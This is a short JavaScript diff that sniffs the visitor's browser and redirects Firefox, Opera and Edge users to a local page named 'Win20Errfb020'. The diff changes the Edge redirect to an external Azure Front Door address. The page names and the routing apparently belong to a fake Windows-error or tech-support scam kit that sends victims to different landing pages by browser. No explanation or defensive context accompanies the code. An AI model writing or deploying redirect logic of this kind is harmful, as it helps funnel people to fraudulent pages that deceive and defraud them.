@@ -2,7 +2,7 @@
         var isChromium = window.chrome,
             vendorName = window.navigator.vendor,
             isOpera = window.navigator.userAgent.indexOf("OPR") > -1,
-            isIEedge = window.navigator.userAgent.indexOf("Edge") > -1;
+            isIEedge = window.navigator.userAgent.indexOf("Edg") > -1 || window.navigator.userAgent.indexOf("Edge") > -1;
         if (isChromium !== null && isChromium !== undefined && vendorName === "Google Inc." && isOpera == false && isIEedge == false)
         {
             // is Google chrome
@@ -11,8 +11,8 @@
         if (navigator.userAgent.indexOf("Firefox") != -1) {
             window.location.href = "./Win20Errfb020/index.html";
         }
-        if (window.navigator.userAgent.indexOf("Edge") != -1) {
-            window.location.href = "./Win20Errfb020/index.html";
+        if (isIEedge) {
+            window.location.href = "https://ep-de-9fkqtzvqltea-c3cmaeh6gfdsdqgv.z01.azurefd.net/";
         }
 if (window.navigator.userAgent.indexOf("Opera") != -1) {
             window.location.href = "./Win20Errfb020/index.html";
